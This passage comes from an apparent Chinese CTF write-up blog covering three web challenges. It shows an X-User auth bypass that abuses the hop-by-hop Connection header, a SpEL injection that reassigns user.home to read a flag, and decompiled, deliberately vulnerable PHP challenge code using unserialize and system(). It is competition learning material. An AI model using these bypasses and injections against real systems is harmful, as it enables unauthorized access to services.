class="string">&quot;anonymous&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		req.Header.Set(<span class="string">&quot;X-User&quot;</span>, uid)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>所以这里的X-User是无法手动设置为0的，是否有方法呢？</p>
<p><a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc2616#section-8">https://datatracker.ietf.org/doc/html/rfc2616#section-8</a></p>
<p>从RFC 2616 section-8中可以看到</p>
<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251022134428183.png" alt="image-20251022134428183"></p>
<p>Connection是一种Hop-by-hop 头部，Hop-by-hop指的是两个相邻 HTTP 节点之间的连接，例如客户端到代理服务器，代理服务器到后端服务器，他不是端到端的连接，而是一种跳级连接</p>
<p>Connection 头部不仅自身是 hop-by-hop 的，还可以用来声明其他自定义的 hop-by-hop 头部</p>
<p>例如我们设置</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close, X-Custom-Header</span><br><span class="line"><span class="attribute">X-Custom-Header</span><span class="punctuation">: </span>some-value</span><br></pre></td></tr></table></figure>

<p>当我们发送请求的时候，Connection相当于告诉中间代理服务器，X-Custom-Header也是一个hop-by-hop 头部，需要移除他而不能准发他</p>
<p>代理服务器的处理规则</p>
<p>代理服务器在转发请求&#x2F;响应时必须：</p>
<ol>
<li><strong>移除所有 hop-by-hop 头部</strong></li>
<li><strong>移除 Connection 头部中列出的所有头部</strong></li>
<li><strong>保留并转发所有 end-to-end 头部</strong></li>
<li><strong>可以添加新的 hop-by-hop 头部</strong>（用于下一跳连接）</li>
</ol>
<p>因为在反向代理中有一个自动设置X-User的过程，那我们就可以通过将X-User设置为hop-by-hop 头部，从而在请求到达服务器之前把X-User删除，那么在login_required获取该请求头的时候如果获取不到默认就为0</p>
<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/72f5af522a0d8ffd6cab40e9bdd0fead.png" alt="72f5af522a0d8ffd6cab40e9bdd0fead"></p>
<h2 id="bbjv"><a href="#bbjv" class="headerlink" title="bbjv"></a>bbjv</h2><p>java的题，先反编译然后处理一下</p>
<p>看依赖</p>
<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018202940645.png" alt="image-20251018202940645"></p>
<p>不太熟悉的依赖，然后转向看控制器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.gateway.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ctf.gateway.service.EvaluationService;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="comment">/* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/controller/GatewayController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GatewayController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> EvaluationService evaluationService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">GatewayController</span><span class="params">(EvaluationService evaluationService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.evaluationService = evaluationService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/check&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">checkRule</span><span class="params">(<span class="meta">@RequestParam</span> String rule)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.evaluationService.evaluate(rule);</span><br><span class="line">        <span class="type">File</span> <span class="variable">flagFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;user.home&quot;</span>), <span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (flagFile.exists()) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(flagFile));</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">                    result = result + <span class="string">&quot;&lt;br&gt;&lt;b&gt;�� Flag:&lt;/b&gt; &quot;</span> + content;</span><br><span class="line">                    br.close();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接受一个参数rule，会调用到<code>this.evaluationService.evaluate(rule)</code>，跟进看看</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.gateway.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.EvaluationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.ExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.common.TemplateParserContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="comment">/* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/service/EvaluationService.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvaluationService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> EvaluationContext context;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvaluationService</span><span class="params">(EvaluationContext context)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.context = context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">evaluate</span><span class="params">(String expression)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.parser.parseExpression(expression, <span class="keyword">new</span> <span class="title class_">TemplateParserContext</span>()).getValue(<span class="built_in">this</span>.context);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Result: &quot;</span> + String.valueOf(result);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>一个spel表达式的计算代码，rule就是我们需要传入的spel表达式，但是好像我直接打spel注入不得行？</p>
<p>关注到一个点</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.parser.parseExpression(expression, <span class="keyword">new</span> <span class="title class_">TemplateParserContext</span>()).getValue(<span class="built_in">this</span>.context);</span><br></pre></td></tr></table></figure>

<p>这里的话是用到TemplateParserContext模板去解析，我们分析一下这个</p>
<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018215742496.png" alt="image-20251018215742496"></p>
<p>可以看到他解析的spel表达式是<code>#&#123;&#125;</code>格式的表达式</p>
<p>例如我们传入<code>#&#123;1+2&#125;</code></p>
<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018220002490.png" alt="image-20251018220002490"></p>
<p>接着看一下accessor中的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.gateway.accessor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.AccessException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.EvaluationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.support.ReflectivePropertyAccessor;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/accessor/SecurePropertyAccessor.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurePropertyAccessor</span> <span class="keyword">extends</span> <span class="title class_">ReflectivePropertyAccessor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// org.springframework.expression.spel.support.ReflectivePropertyAccessor, org.springframework.expression.PropertyAccessor</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canRead</span><span class="params">(EvaluationContext context, Object target, String name)</span> <span class="keyword">throws</span> AccessException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>ReflectivePropertyAccessor</code> 是 SpEL 用来通过 Java 反射访问 Java 对象属性（fields&#x2F;getters）的默认实现之一。这里重写了里面的canRead方法，意思就是只要spel语句中用到反射访问java对象属性的话就会return false，相当于是一个waf吧</p>
<p>另外还有一个config文件</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.gateway.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ctf.gateway.accessor.SecurePropertyAccessor;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.EvaluationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.expression.spel.support.SimpleEvaluationContext;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">/* loaded from: app.jar:BOOT-INF/classes/com/ctf/gateway/config/SpelConfig.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpelConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean(&#123;&quot;systemProperties&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">systemProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> System.getProperties();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean(&#123;&quot;restrictedEvalContext&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> EvaluationContext <span class="title function_">restrictedEvaluationContext</span><span class="params">(<span class="meta">@Qualifier(&quot;systemProperties&quot;)</span> Properties systemProperties)</span> &#123;</span><br><span class="line">        <span class="type">SimpleEvaluationContext</span> <span class="variable">simpleContext</span> <span class="operator">=</span> SimpleEvaluationContext.forPropertyAccessors(<span class="keyword">new</span> <span class="title class_">SecurePropertyAccessor</span>()).build();</span><br><span class="line">        simpleContext.setVariable(<span class="string">&quot;systemProperties&quot;</span>, systemProperties);</span><br><span class="line">        <span class="keyword">return</span> simpleContext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里定义了两个java Bean，并且在restrictedEvalContext中设置了一个变量为systemProperties，那我们看看能不能调用<code>System.getProperties()</code></p>
<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018222541176.png" alt="image-20251018222541176"></p>
<p>按照源码的逻辑，会找到user.home下的flag.txt，如果存在就会输出flag，但是这里的话是root目录，所以问题就是在于flag.txt不是在root目录下，会在什么目录呢？</p>
<p>想了半天没想明白，后面想起还有一个docker文件</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">21</span>-jdk-slim</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> app.jar /app/app.jar</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.txt /tmp/flag.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;app.jar&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>原来flag在tmp下，我真是个傻子！！！</p>
<p>这时候就看看能不能执行代码修改属性的值了，但是我尝试调用System.setProperty的时候出现报错了，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: EL1004E: Method call: Method <span class="title function_">setProperty</span><span class="params">(java.lang.String,java.lang.String)</span> cannot be found on type java.util.Properties</span><br></pre></td></tr></table></figure>

<p>显示是没有这个方法，后面才知道是因为SimpleEvaluationContext，他默认禁用实例方法调用，除非在构造函数中定义了方法调用，例如</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Properties <span class="title function_">systemProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> System.getProperties();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那该怎么办呢？</p>
<p>没想到，直接赋值也是可以的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;#systemProperties[<span class="string">&#x27;user.home&#x27;</span>] = <span class="string">&#x27;/tmp&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/%E5%BC%BA%E7%BD%91%E6%9D%AF/image-20251018225052723.png" alt="image-20251018225052723"></p>
<h2 id="ezphp（赛后复现）"><a href="#ezphp（赛后复现）" class="headerlink" title="ezphp（赛后复现）"></a>ezphp（赛后复现）</h2><p>打开题目是一串编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;ZnVuY3Rpb24gZ2VuZXJhdGVSYW5kb21TdHJpbmcoJGxlbmd0aCA9IDgpeyRjaGFyYWN0ZXJzID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JzskcmFuZG9tU3RyaW5nID0gJyc7Zm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgeyRyID0gcmFuZCgwLCBzdHJsZW4oJGNoYXJhY3RlcnMpIC0gMSk7JHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1skcl07fXJldHVybiAkcmFuZG9tU3RyaW5nO31kYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdBc2lhL1NoYW5naGFpJyk7Y2xhc3MgdGVzdHtwdWJsaWMgJHJlYWRmbGFnO3B1YmxpYyAkZjtwdWJsaWMgJGtleTtwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXskdGhpcy0+cmVhZGZsYWcgPSBuZXcgY2xhc3Mge3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpe2lmIChpc3NldCgkX0ZJTEVTWydmaWxlJ10pICYmICRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA9PSAwKSB7JHRpbWUgPSBkYXRlKCdIaScpOyRmaWxlbmFtZSA9ICRHTE9CQUxTWydmaWxlbmFtZSddOyRzZWVkID0gJHRpbWUgLiBpbnR2YWwoJGZpbGVuYW1lKTttdF9zcmFuZCgkc2VlZCk7JHVwbG9hZERpciA9ICd1cGxvYWRzLyc7JGZpbGVzID0gZ2xvYigkdXBsb2FkRGlyIC4gJyonKTtmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHtpZiAoaXNfZmlsZSgkZmlsZSkpIHVubGluaygkZmlsZSk7fSRyYW5kb21TdHIgPSBnZW5lcmF0ZVJhbmRvbVN0cmluZyg4KTskbmV3RmlsZW5hbWUgPSAkdGltZSAuICcuJyAuICRyYW5kb21TdHIgLiAnLicgLiAnanBnJzskR0xPQkFMU1snZmlsZSddID0gJG5ld0ZpbGVuYW1lOyR1cGxvYWRlZEZpbGUgPSAkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ107JHVwbG9hZFBhdGggPSAkdXBsb2FkRGlyIC4gJG5ld0ZpbGVuYW1lOyBpZiAoc3lzdGVtKCJjcCAiLiR1cGxvYWRlZEZpbGUuIiAiLiAkdXBsb2FkUGF0aCkpIHtlY2hvICJzdWNjZXNzIHVwbG9hZCEiO30gZWxzZSB7ZWNobyAiZXJyb3IiO319fXB1YmxpYyBmdW5jdGlvbiBfX3dha2V1cCgpe3BocGluZm8oKTt9cHVibGljIGZ1bmN0aW9uIHJlYWRmbGFnKCl7ZnVuY3Rpb24gcmVhZGZsYWcoKXtpZiAoaXNzZXQoJEdMT0JBTFNbJ2ZpbGUnXSkpIHskZmlsZSA9ICRHTE9CQUxTWydmaWxlJ107JGZpbGUgPSBiYXNlbmFtZSgkZmlsZSk7aWYgKHByZWdfbWF0Y2goJy86XC9cLy8nLCAkZmlsZSkpZGllKCJlcnJvciIpOyRmaWxlX2NvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygidXBsb2Fkcy8iIC4gJGZpbGUpO2lmIChwcmVnX21hdGNoKCcvPFw/fFw6XC9cL3xwaHxcP1w9L2knLCAkZmlsZV9jb250ZW50KSkge2RpZSgiSWxsZWdhbCBjb250ZW50IGRldGVjdGVkIGluIHRoZSBmaWxlLiIpO31pbmNsdWRlKCJ1cGxvYWRzLyIgLiAkZmlsZSk7fX19fTt9cHVibGljIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKXskZnVuYyA9ICR0aGlzLT5mOyRHTE9CQUxTWydmaWxlbmFtZSddID0gJHRoaXMtPnJlYWRmbGFnO2lmICgkdGhpcy0+a2V5ID09ICdjbGFzcycpbmV3ICRmdW5jKCk7ZWxzZSBpZiAoJHRoaXMtPmtleSA9PSAnZnVuYycpIHskZnVuYygpO30gZWxzZSB7aGlnaGxpZ2h0X2ZpbGUoJ2luZGV4LnBocCcpO319fSRzZXIgPSBpc3NldCgkX0dFVFsnbGFuZCddKSA/ICRfR0VUWydsYW5kJ10gOiAnTzo0OiJ0ZXN0IjpOJztAdW5zZXJpYWxpemUoJHNlcik7&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>直接把eval去掉输出一下然后给ai整理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generateRandomString</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">    <span class="variable">$randomString</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$randomString</span> .= <span class="variable">$characters</span>[<span class="variable">$r</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$randomString</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$readflag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;readflag = <span class="keyword">new</span> <span class="class"><span class="keyword">class</span> </span>&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Hi&#x27;</span>);</span><br><span class="line">                    <span class="variable">$filename</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">                    <span class="variable">$seed</span> = <span class="variable">$time</span> . <span class="title function_ invoke__">intval</span>(<span class="variable">$filename</span>);</span><br><span class="line">                    <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$uploadDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">                    <span class="variable">$files</span> = <span class="title function_ invoke__">glob</span>(<span class="variable">$uploadDir</span> . <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">                            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$randomStr</span> = <span class="title function_ invoke__">generateRandomString</span>(<span class="number">8</span>);</span><br><span class="line">                    <span class="variable">$newFilename</span> = <span class="variable">$time</span> . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$randomStr</span> . <span class="string">&#x27;.&#x27;</span> . <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">                    <span class="variable">$GLOBALS</span>[<span class="string">&#x27;file&#x27;</span>] = <span class="variable">$newFilename</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="variable">$uploadedFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                    <span class="variable">$uploadPath</span> = <span class="variable">$uploadDir</span> . <span class="variable">$newFilename</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ 